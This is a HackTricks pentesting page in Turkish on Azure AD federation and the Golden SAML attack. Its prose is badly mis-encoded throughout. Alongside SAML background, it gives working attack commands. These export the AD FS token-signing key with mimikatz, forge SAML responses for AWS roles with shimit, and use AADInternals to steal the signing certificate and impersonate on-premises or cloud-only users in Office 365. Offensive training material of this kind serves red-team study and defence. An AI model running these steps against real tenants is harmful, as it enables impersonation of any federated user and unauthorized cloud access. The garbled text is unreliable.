# Az - Federation

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ Discord grubuna** [**katÄ±lÄ±n**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **HackTricks'e PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub depolarÄ±na.

</details>
{% endhint %}

## Temel Bilgiler

[Belgelerden:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federation** bir **gÃ¼ven** oluÅŸturmuÅŸ **alanlar** topluluÄŸudur. GÃ¼ven seviyesi deÄŸiÅŸebilir, ancak genellikle **kimlik doÄŸrulama** ve neredeyse her zaman **yetkilendirme** iÃ§erir. Tipik bir federasyon, **paylaÅŸÄ±lan kaynaklara eriÅŸim** iÃ§in **gÃ¼ven** oluÅŸturmuÅŸ **bir dizi organizasyonu** iÃ§erebilir.

**Yerel ortamÄ±nÄ±zÄ± Azure AD ile federasyon** yapabilir ve bu federasyonu kimlik doÄŸrulama ve yetkilendirme iÃ§in kullanabilirsiniz. Bu oturum aÃ§ma yÃ¶ntemi, tÃ¼m kullanÄ±cÄ± **kimlik doÄŸrulamasÄ±nÄ±n yerel ortamda** gerÃ§ekleÅŸmesini saÄŸlar. Bu yÃ¶ntem, yÃ¶neticilerin daha katÄ± eriÅŸim kontrol seviyeleri uygulamasÄ±na olanak tanÄ±r. **AD FS** ve PingFederate ile federasyon mÃ¼mkÃ¼ndÃ¼r.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

Temel olarak, Federasyon'da tÃ¼m **kimlik doÄŸrulama** **yerel ortamda** gerÃ§ekleÅŸir ve kullanÄ±cÄ±, tÃ¼m gÃ¼venilir ortamlarda SSO deneyimi yaÅŸar. Bu nedenle, kullanÄ±cÄ±lar **yerel kimlik bilgilerini** kullanarak **bulut** uygulamalarÄ±na **eriÅŸebilirler**.

**Security Assertion Markup Language (SAML)**, saÄŸlayÄ±cÄ±lar arasÄ±nda tÃ¼m kimlik doÄŸrulama ve yetkilendirme **bilgilerini** **deÄŸiÅŸtirmek** iÃ§in kullanÄ±lÄ±r.

Herhangi bir federasyon kurulumunda Ã¼Ã§ taraf vardÄ±r:

* KullanÄ±cÄ± veya Ä°stemci
* Kimlik SaÄŸlayÄ±cÄ± (IdP)
* Hizmet SaÄŸlayÄ±cÄ± (SP)

(GÃ¶rseller https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps adresinden alÄ±nmÄ±ÅŸtÄ±r)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. BaÅŸlangÄ±Ã§ta, bir kullanÄ±cÄ± bir uygulamaya (Hizmet SaÄŸlayÄ±cÄ± veya SP, Ã¶rneÄŸin AWS konsolu veya vSphere web istemcisi) eriÅŸir. Bu adÄ±m atlanabilir ve istemci doÄŸrudan IdP'ye (Kimlik SaÄŸlayÄ±cÄ±) yÃ¶nlendirilebilir, bu belirli uygulamaya baÄŸlÄ±dÄ±r.
2. Daha sonra, SP kullanÄ±cÄ± kimlik doÄŸrulamasÄ± iÃ§in uygun IdP'yi (Ã¶rneÄŸin, AD FS, Okta) belirler. Bir SAML (Security Assertion Markup Language) AuthnRequest oluÅŸturur ve istemciyi seÃ§ilen IdP'ye yÃ¶nlendirir.
3. IdP devralÄ±r ve kullanÄ±cÄ±yÄ± kimlik doÄŸrular. Kimlik doÄŸrulama sonrasÄ±, IdP tarafÄ±ndan bir SAMLResponse oluÅŸturulur ve kullanÄ±cÄ± aracÄ±lÄ±ÄŸÄ±yla SP'ye iletilir.
4. Son olarak, SP SAMLResponse'u deÄŸerlendirir. BaÅŸarÄ±yla doÄŸrulanÄ±rsa, IdP ile bir gÃ¼ven iliÅŸkisi olduÄŸunu ima eder ve kullanÄ±cÄ±ya eriÅŸim izni verir. Bu, oturum aÃ§ma sÃ¼recinin tamamlandÄ±ÄŸÄ±nÄ± ve kullanÄ±cÄ±nÄ±n hizmeti kullanabileceÄŸini gÃ¶sterir.

**SAML kimlik doÄŸrulamasÄ± ve yaygÄ±n saldÄ±rÄ±lar hakkÄ±nda daha fazla bilgi edinmek istiyorsanÄ±z:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS, iddia tabanlÄ± bir kimlik modelidir.
* "..iddialar, kullanÄ±cÄ±lar hakkÄ±nda yapÄ±lan ve esas olarak internet Ã¼zerindeki herhangi bir yerde bulunan iddia tabanlÄ± uygulamalara eriÅŸimi yetkilendirmek iÃ§in kullanÄ±lan basit ifadeler (Ã¶rneÄŸin, ad, kimlik, grup) dir."
* Bir kullanÄ±cÄ± iÃ§in iddialar SAML belirteÃ§lerine yazÄ±lÄ±r ve ardÄ±ndan IdP tarafÄ±ndan gizlilik saÄŸlamak iÃ§in imzalanÄ±r.
* Bir kullanÄ±cÄ± ImmutableID ile tanÄ±mlanÄ±r. Bu, kÃ¼resel olarak benzersizdir ve Azure AD'de saklanÄ±r.
* ImmutableID, kullanÄ±cÄ± iÃ§in yerel ortamda ms-DS-ConsistencyGuid olarak saklanÄ±r ve/veya kullanÄ±cÄ±nÄ±n GUID'sinden tÃ¼retilebilir.
* Daha fazla bilgi iÃ§in [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML saldÄ±rÄ±sÄ±:**

* ADFS'de, SAML YanÄ±tÄ± bir belirteÃ§ imzalama sertifikasÄ± ile imzalanÄ±r.
* Sertifika ele geÃ§irilirse, Azure AD'ye Azure AD'ye senkronize edilmiÅŸ HERHANGÄ° bir kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak mÃ¼mkÃ¼ndÃ¼r!
* PTA kÃ¶tÃ¼ye kullanÄ±mÄ± gibi, bir kullanÄ±cÄ±nÄ±n ÅŸifresini deÄŸiÅŸtirmek veya MFA, kimlik doÄŸrulama yanÄ±tÄ±nÄ± sahte olarak oluÅŸturduÄŸumuz iÃ§in hiÃ§bir etkisi olmayacaktÄ±r.
* Sertifika, DA ayrÄ±calÄ±klarÄ± ile AD FS sunucusundan Ã§Ä±karÄ±labilir ve ardÄ±ndan internet baÄŸlantÄ±lÄ± herhangi bir makineden kullanÄ±labilir.
* Daha fazla bilgi iÃ§in [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

Bir **Kimlik SaÄŸlayÄ±cÄ± (IdP)**'nin kullanÄ±cÄ± oturum aÃ§ma yetkisi vermek iÃ§in bir **SAMLResponse** Ã¼retme sÃ¼reci Ã§ok Ã¶nemlidir. IdP'nin belirli uygulamasÄ±na baÄŸlÄ± olarak, **yanÄ±t** **imzalanabilir** veya **ÅŸifrelenebilir** ve **IdP'nin Ã¶zel anahtarÄ±** kullanÄ±larak yapÄ±lÄ±r. Bu prosedÃ¼r, **Hizmet SaÄŸlayÄ±cÄ± (SP)**'nin SAMLResponse'un doÄŸruluÄŸunu onaylamasÄ±nÄ± saÄŸlar ve bunun gerÃ§ekten gÃ¼venilir bir IdP tarafÄ±ndan verildiÄŸini garanti eder.

[Golden ticket saldÄ±rÄ±sÄ±](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket) ile paralellik kurulabilir, burada kullanÄ±cÄ±nÄ±n kimliÄŸini ve izinlerini doÄŸrulayan anahtar (golden ticket iÃ§in KRBTGT, golden SAML iÃ§in belirteÃ§ imzalama Ã¶zel anahtarÄ±) manipÃ¼le edilerek **kimlik doÄŸrulama nesnesi** (TGT veya SAMLResponse) sahte olarak oluÅŸturulabilir. Bu, herhangi bir kullanÄ±cÄ±nÄ±n taklit edilmesine ve SP'ye yetkisiz eriÅŸim saÄŸlanmasÄ±na olanak tanÄ±r.

Golden SAML'ler bazÄ± avantajlar sunar:

* **Uzaktan oluÅŸturulabilirler**, ilgili alan veya federasyonun bir parÃ§asÄ± olmaya gerek kalmadan.
* **Ä°ki FaktÃ¶rlÃ¼ Kimlik DoÄŸrulama (2FA)** etkin olsa bile etkili kalÄ±rlar.
* BelirteÃ§ imzalama **Ã¶zel anahtarÄ± otomatik olarak yenilenmez**.
* **Bir kullanÄ±cÄ±nÄ±n ÅŸifresini deÄŸiÅŸtirmek**, zaten oluÅŸturulmuÅŸ bir SAML'i geÃ§ersiz kÄ±lmaz.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) Microsoft'un, gÃ¼venilir iÅŸ ortaklarÄ± (federasyon) arasÄ±nda **kimlik bilgilerini gÃ¼venli bir ÅŸekilde deÄŸiÅŸ tokuÅŸ etmeyi** saÄŸlayan bir hizmetidir. Esasen, bir alan hizmetinin federasyon iÃ§indeki diÄŸer hizmet saÄŸlayÄ±cÄ±larla kullanÄ±cÄ± kimliklerini paylaÅŸmasÄ±na olanak tanÄ±r.

AWS'nin ele geÃ§irilmiÅŸ alana (bir federasyonda) gÃ¼venmesiyle, bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, AWS ortamÄ±nda **herhangi bir izin elde etmek** iÃ§in kullanÄ±labilir. SaldÄ±rÄ±, SAML nesnelerini imzalamak iÃ§in kullanÄ±lan **Ã¶zel anahtarÄ±** gerektirir, tÄ±pkÄ± golden ticket saldÄ±rÄ±sÄ±nda KRBTGT'ye ihtiyaÃ§ duyulduÄŸu gibi. Bu Ã¶zel anahtarÄ± elde etmek iÃ§in AD FS kullanÄ±cÄ± hesabÄ±na eriÅŸim yeterlidir.

Golden SAML saldÄ±rÄ±sÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in gerekenler:

* **BelirteÃ§ imzalama Ã¶zel anahtarÄ±**
* **IdP genel sertifikasÄ±**
* **IdP adÄ±**
* **Rol adÄ± (Ã¼stlenilecek rol)**
* Domain\kullanÄ±cÄ± adÄ±
* AWS'de rol oturum adÄ±
* Amazon hesap kimliÄŸi

_YalnÄ±zca kalÄ±n yazÄ±lan Ã¶ÄŸeler zorunludur. DiÄŸerleri istenildiÄŸi gibi doldurulabilir._

**Ã–zel anahtarÄ±** elde etmek iÃ§in **AD FS kullanÄ±cÄ± hesabÄ±na** eriÅŸim gereklidir. Buradan, Ã¶zel anahtar **kiÅŸisel depodan** [mimikatz](https://github.com/gentilkiwi/mimikatz) gibi araÃ§lar kullanÄ±larak dÄ±ÅŸa aktarÄ±labilir. DiÄŸer gerekli bilgileri toplamak iÃ§in, ADFS kullanÄ±cÄ±sÄ± olarak oturum aÃ§tÄ±ÄŸÄ±nÄ±zdan emin olarak Microsoft.Adfs.Powershell snapin'i ÅŸu ÅŸekilde kullanabilirsiniz:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
TÃ¼m bilgilerle, [**shimit**](https://github.com/cyberark/shimit)**'i kullanarak taklit etmek istediÄŸiniz kullanÄ±cÄ± olarak geÃ§erli bir SAMLResponse'u unutmak mÃ¼mkÃ¼ndÃ¼r:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### On-prem -> cloud
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
Bulut yalnÄ±z kullanÄ±cÄ±larÄ±nÄ±n ImmutableID'sini oluÅŸturmak ve onlarÄ± taklit etmek de mÃ¼mkÃ¼ndÃ¼r.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## Referanslar

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
AWS Hacking Ã¶ÄŸren & pratik yap:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸren & pratik yap: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n.

</details>
{% endhint %}
